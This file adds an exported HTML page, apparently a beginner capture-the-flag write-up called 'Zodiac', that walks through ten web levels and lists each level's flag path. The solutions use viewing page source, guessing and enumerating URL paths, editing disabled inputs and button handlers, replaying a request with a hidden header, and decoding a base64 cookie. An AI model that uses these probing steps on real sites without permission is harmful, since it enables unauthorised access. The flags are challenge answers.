@@ -1,0 +1,869 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>Zodiac Write-up</title><link rel="icon" href="./img/zodiac-icon.ico" type="image/x-icon"><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 3px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	padding-inline-start: 0;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.page-description {
+    margin-bottom: 2em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-block;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1.25em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(55, 53, 47, 1);
+}
+.highlight-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.highlight-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.highlight-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.highlight-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.highlight-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.highlight-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.highlight-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.highlight-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.highlight-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.highlight-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.highlight-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.highlight-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.highlight-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.highlight-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.highlight-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.block-color-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.block-color-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.block-color-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.block-color-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.block-color-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.block-color-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.block-color-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.block-color-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.block-color-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.block-color-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.block-color-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.block-color-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.select-value-color-uiBlue { background-color: rgba(35, 131, 226, .07); }
+.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
+.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
+.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
+.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
+.select-value-color-transparentGray { background-color: rgba(227, 226, 224, 0); }
+.select-value-color-translucentGray { background-color: rgba(0, 0, 0, 0.06); }
+.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
+.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
+.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
+.select-value-color-yellow { background-color: rgba(253, 236, 200, 1); }
+.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }
+.select-value-color-pageGlass { background-color: undefined; }
+.select-value-color-washGlass { background-color: undefined; }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="25a10e3c-d26c-47b9-a189-a7b3f1661e09" class="page sans"><header><img class="page-cover-image" src="./img/zodiac-poster.jpg" style="object-position:center 96.86%"/><div class="page-header-icon page-header-icon-with-cover"><img class="icon" src="./img/zodiac-icon.ico"/></div><h1 class="page-title">Zodiac Write-up</h1><p class="page-description"></p></header><div class="page-body"><p id="0581a9ce-2451-4d58-98b4-ec185994ecfb" class="">
+</p><p id="abb4f60c-985e-45d2-ac82-db71ea5cc9d2" class="">
+</p><h1 id="fdb6b017-4909-4357-969d-97b20d874894" class="">Level 01</h1><ul id="4cb93f67-4763-43e8-a95b-427e65657865" class="bulleted-list"><li style="list-style-type:disc">Looked at the URL and noticed <code>/level-01/</code></li></ul><ul id="c72b46ba-b587-40c4-b7c2-87c506d695af" class="bulleted-list"><li style="list-style-type:disc">So I tried to brute force for fun <code>/level-</code><mark class="highlight-teal"><code>02/</code></mark><mark class="highlight-red"><code>03/04 …</code></mark></li></ul><ul id="be41e68f-2659-466c-9f4a-893d74e92b3a" class="bulleted-list"><li style="list-style-type:disc">But only <code>/level-02/</code> worked .</li></ul><h3 id="a4a47531-d854-4c0a-9297-373653fba17e" class="">FLAG: <code>/level-02</code></h3><p id="a9e1a5da-8946-431a-9a19-abed946f0cdb" class="">
+</p><h1 id="a5487049-6b37-438a-b50e-4b90e6b7de5a" class="">Level 02</h1><ul id="4c97ddd8-52af-456b-9d5f-269369fecc9c" class="bulleted-list"><li style="list-style-type:disc">Opened <code>view page source code</code> in browser to check the code.</li></ul><ul id="b56dcc30-085a-46f7-8a4f-5a785afaa15b" class="bulleted-list"><li style="list-style-type:disc">Noticed <code>&lt;!--  Level 3 -&gt; /gNQQW0C3IQ  --&gt;</code> and got the next level.</li></ul><h3 id="e1220971-5d1f-4712-8348-20b3d8545298" class="">FLAG: <code>/gNQQW0C3IQ</code></h3><p id="e61bbdfc-ce07-4664-9465-51ee8d9c8373" class="">
+</p><h1 id="52ad9e5a-f096-412c-9952-76efec5eabf4" class="">Level 03</h1><ul id="06b71a64-21ad-433d-83de-6a5697ba424c" class="bulleted-list"><li style="list-style-type:disc">Opened <code>view page source code</code> in browser to check the code.</li></ul><ul id="35383af7-b876-4406-b443-d2761da28f10" class="bulleted-list"><li style="list-style-type:disc">Noticed an external JavaScript <mark class="highlight-default">(</mark><code>statics/js/script.js</code><mark class="highlight-default">) URL </mark>and opened it.</li></ul><ul id="47b6783a-eb47-453d-b63d-eaa925f81938" class="bulleted-list"><li style="list-style-type:disc">Got the next level there</li></ul><h3 id="1504a6cb-7329-4d19-8cf4-f6efdad14081" class="">FLAG: <code>/EZhLOYrqe5</code></h3><p id="55583ae1-61b8-4b78-a7b7-66b6e88cb5e1" class="">
+</p><h1 id="6e692886-a370-4f00-a9e8-280718278ce8" class="">Level 04</h1><ul id="84d33af8-3e43-4a27-9120-182a47ff8dcd" class="bulleted-list"><li style="list-style-type:disc">Opened <code>view page source code</code> in browser to check the code.</li></ul><ul id="3973cff4-7c4a-4dc5-9013-0b0c6a9aef4d" class="bulleted-list"><li style="list-style-type:disc">Noticed an external JavaScript <mark class="highlight-default">(</mark><code>statics/js/script.js</code><mark class="highlight-default">) </mark>code and opened it.</li></ul><ul id="df623dfb-d85d-4cc5-985c-01fc1b6a1abc" class="bulleted-list"><li style="list-style-type:disc">I thought I will get the next level but I got <code>404</code>.</li></ul><ul id="0cf26743-8402-44e6-82b0-26857a3f4ca0" class="bulleted-list"><li style="list-style-type:disc">Depending on my experience from downloading movies from websites and index dork I tried to explore directories.</li></ul><ul id="dacf16b8-b8b5-4923-b45a-245a6ef33cdb" class="bulleted-list"><li style="list-style-type:disc">So I opened <code>statics/js</code> and noticed a JavaScript file (<code>next.js</code>).</li></ul><ul id="19d78953-0d6f-4fbd-b117-b5e70c1aa783" class="bulleted-list"><li style="list-style-type:disc">Opened it and got the next level.</li></ul><h3 id="77bbed74-be01-4ee6-a032-b7e3b522236b" class="">FLAG: <code>/uAR0b1n0yV</code></h3><p id="7ed5efda-b8eb-4cc8-91c8-32eb4df81616" class="">
+</p><h1 id="3fd3014e-2602-4ea8-81e9-d659d5b133c9" class="">Level 05</h1><ul id="3409eb52-9d36-4d87-8a58-2283d2ca98be" class="bulleted-list"><li style="list-style-type:disc">Opened <code>view page source code</code> in browser to check the code.</li></ul><ul id="adc2650f-e53c-46b4-ad9a-dced0cb2565e" class="bulleted-list"><li style="list-style-type:disc">Noticed an external JavaScript <mark class="highlight-default">(</mark><code>statics/user_js/script.js</code><mark class="highlight-default">) </mark>code and opened it.</li></ul><ul id="5441103f-8d12-41de-bce0-8ecd0df3e79e" class="bulleted-list"><li style="list-style-type:disc">Nothing interesting here :)</li></ul><ul id="080aa348-fb78-4e83-ac29-1c91830c7b60" class="bulleted-list"><li style="list-style-type:disc">Then I thought logically if they have <code>user_js</code> they probably have <code>admin_js</code> .</li></ul><ul id="4d690264-13e6-4486-8918-5331696e258d" class="bulleted-list"><li style="list-style-type:disc">tried <code>statics/admin_js/script.js</code> and got the next level.</li></ul><h3 id="6d14f5a8-af0a-4009-99f2-ed57545d04d2" class="">FLAG: <code>/5WHKh0yEQj</code></h3><p id="763d5c82-8d98-4ece-8674-c51b23f38765" class="">
+</p><h1 id="4ce5a900-383a-4c79-961f-eccf0b8e5e38" class="">Level 06</h1><ul id="f3e9a338-9eac-4bfc-aa18-b6846ae60e26" class="bulleted-list"><li style="list-style-type:disc">Opened <code>view page source code</code> in browser to check the code.</li></ul><ul id="680b0690-cfea-4215-ab9f-c7c2f473c5a0" class="bulleted-list"><li style="list-style-type:disc">Noticed an external JavaScript <mark class="highlight-default">(</mark><code>statics/js/26.js</code><mark class="highlight-default">) </mark>code and opened it.</li></ul><ul id="93b1e5cb-c830-4945-b7dd-61dd51fbe0bf" class="bulleted-list"><li style="list-style-type:disc">Then they got me there :)</li></ul><ul id="456dd28a-fab8-42e0-b873-f7516b2ae876" class="bulleted-list"><li style="list-style-type:disc">After some times I noticed the number as filename.</li></ul><ul id="7bdc38cc-8d49-4219-a600-d66a69f337c4" class="bulleted-list"><li style="list-style-type:disc">I started to brute force from <code>0-26</code>  and then I got them in <mark class="highlight-red"><code>0.js</code></mark><mark class="highlight-default"> .</mark></li></ul><h3 id="1b699cc5-4a5a-4b9c-ac5f-5afd9ef1d79c" class="">FLAG: <code>/PcZv3rIPJ8</code></h3><p id="e6a715c7-77a7-49b8-9e60-fd07e1cb7147" class="">
+</p><h1 id="0355d03b-c2c7-4a7e-923c-6a96e4802ed7" class="">Level 07</h1><ul id="4fb3df87-adb0-44c4-a1ec-464fc0443550" class="bulleted-list"><li style="list-style-type:disc">I first tried to fill the input and submit it, but failed (I couldn’t add the input).</li></ul><ul id="72aff17b-7eed-48a5-a326-893f2e809b18" class="bulleted-list"><li style="list-style-type:disc">So opened <code>view page source code</code> in browser to check the code.</li></ul><ul id="2184f29a-a05c-427a-bd6e-663288ffd632" class="bulleted-list"><li style="list-style-type:disc">Noticed that the <code>input</code> tag is <code>disabled</code> .</li></ul><ul id="3614d3bf-dc54-4732-a076-768d575391f2" class="bulleted-list"><li style="list-style-type:disc">So opened Browser <code>inspect &gt; inspector</code> and made it enabled by removing <code>disabled</code> from <code>input</code> tag .</li></ul><ul id="9f133122-38d6-4ddb-ae3b-54cb130c4d70" class="bulleted-list"><li style="list-style-type:disc">Then the page reloaded and got the next level.</li></ul><h3 id="eb4ef432-72f6-4278-ace9-accb6af2aabe" class="">FLAG: <code>/0576ucjDmY</code></h3><p id="fcacb426-8446-40da-95f7-105ee497bb18" class="">
+</p><h1 id="17f832ca-5076-40e0-b8a5-43b70cbf6e43" class="">Level 08</h1><ul id="96ecc384-b2bc-4129-b39f-33160ed72e4d" class="bulleted-list"><li style="list-style-type:disc">I first tried to fill the input and submit it, but failed (The submit button seemed to be broken).</li></ul><ul id="2b752d6c-6592-407a-a20f-f24040ca3e03" class="bulleted-list"><li style="list-style-type:disc">So opened <code>view page source code</code> in browser to check the code.</li></ul><ul id="76e4b6aa-f6c1-419d-bb75-9106a45fb505" class="bulleted-list"><li style="list-style-type:disc">Noticed an external JavaScript <mark class="highlight-default">(</mark><code>statics/js/script.js</code><mark class="highlight-default">) </mark>code and opened it.</li></ul><ul id="ad2de689-76e4-4eec-a150-43ac10913539" class="bulleted-list"><li style="list-style-type:disc">Script was an <code>EventListener</code> function named <code>submit</code> .</li></ul><ul id="1b646cf4-12e0-4f19-a699-ea0aee4866b5" class="bulleted-list"><li style="list-style-type:disc">Then I got the point that button needs an event.</li></ul><ul id="bf3532c8-0339-45d4-a026-a58dc930f31d" class="bulleted-list"><li style="list-style-type:disc">So I added <code>onclick=”submit()”</code> to <code>button</code> tag from <code>inspect &gt; inspector</code> .</li></ul><ul id="7d0c35f3-b547-4529-b351-7db3a3fd460d" class="bulleted-list"><li style="list-style-type:disc">Then the page reloaded and got the next level.</li></ul><h3 id="b41c142d-1383-4b65-ae67-5198995760f3" class="">FLAG: <code>/rio7Da0ZYG</code></h3><p id="073388ed-b368-437e-bca7-237275468f42" class="">
+</p><h1 id="875353e4-8634-4835-8846-caafe5167e63" class="">Level 09</h1><ul id="1f95c5d4-187c-4562-85fc-5ba327661dcd" class="bulleted-list"><li style="list-style-type:disc">Opened <code>view page source code</code> in browser to check the code.</li></ul><ul id="3ca5e8a1-1e32-4999-8f79-e152c0a6041f" class="bulleted-list"><li style="list-style-type:disc">Noticed an external JavaScript <mark class="highlight-default">(</mark><code>statics/js/script.js</code><mark class="highlight-default">) </mark>code and opened it.</li></ul><ul id="9983c1ba-f59c-4de1-80ad-01fd57054c86" class="bulleted-list"><li style="list-style-type:disc">It was an fetch function posting a request with specific body and headers.</li></ul><ul id="745cab8a-82cc-439d-b9be-795de31898fa" class="bulleted-list"><li style="list-style-type:disc">So I tried to run it in <code>browser console</code> but got no key :(</li></ul><ul id="92178997-77e3-4551-9112-665046a1e3f4" class="bulleted-list"><li style="list-style-type:disc">Then I noticed <code>next=${!!(false * true)}</code> which was in body .</li></ul><ul id="237c55ff-4e8c-46cb-a315-89a5d1c1e044" class="bulleted-list"><li style="list-style-type:disc">Ran <code>!!(false * true)</code> in console and it returned <code>false</code> , so I tried to change it to <code>true</code> . </li></ul><ul id="7b0b0047-4a35-42e4-903a-124edae63c72" class="bulleted-list"><li style="list-style-type:disc">Still got no result until I noticed the that a <code>x-name</code> header is commented.</li></ul><ul id="bf6aadbf-83b2-459b-a488-cec6affdeb38" class="bulleted-list"><li style="list-style-type:disc">So I tried with that header and got the next level from <code>inspect &gt; network</code>.</li></ul><h3 id="bece8de9-7356-484b-9551-a60c63913137" class="">FLAG: <code>/NzEHQEm0ko</code></h3><p id="7c05aedd-b176-46cd-81b1-f9fd980d82da" class="">
+</p><h1 id="bb6dcaf7-15ab-4ce0-b12b-7f216cb783d1" class="">Level 10</h1><ul id="487ef036-b593-4e7e-b949-b478e04ee627" class="bulleted-list"><li style="list-style-type:disc">I saw the main text talking about cookie and went straightly to <code>inspect &gt; storage &gt; cookie</code> .</li></ul><ul id="97240009-2282-4f04-be2c-430566bf7e3a" class="bulleted-list"><li style="list-style-type:disc">Noticed a cookie named <code>next-level</code> .</li></ul><ul id="42648f84-280f-4c1f-9747-052fd8bc6f54" class="bulleted-list"><li style="list-style-type:disc">I tried it as the next level key but failed.</li></ul><ul id="6e0725fb-bd78-4bf2-87a2-484aacc42f6d" class="bulleted-list"><li style="list-style-type:disc">Then I thought it may be encoded.</li></ul><ul id="8bb1cab5-4b40-4748-80c2-d82c1806db78" class="bulleted-list"><li style="list-style-type:disc">So I tried famous <mark class="highlight-red"><code>base64</code></mark><mark class="highlight-red"> </mark><mark class="highlight-default">to decode</mark><mark class="highlight-red"> </mark><mark class="highlight-default">and got the next level.</mark></li></ul><h3 id="ede75b49-646d-4c00-9973-d94e8d02bfd4" class="">FLAG: <code>/2YruFQiP0L</code></h3><p id="0cc350b7-87b4-4019-9568-58a3fb7e0214" class="">
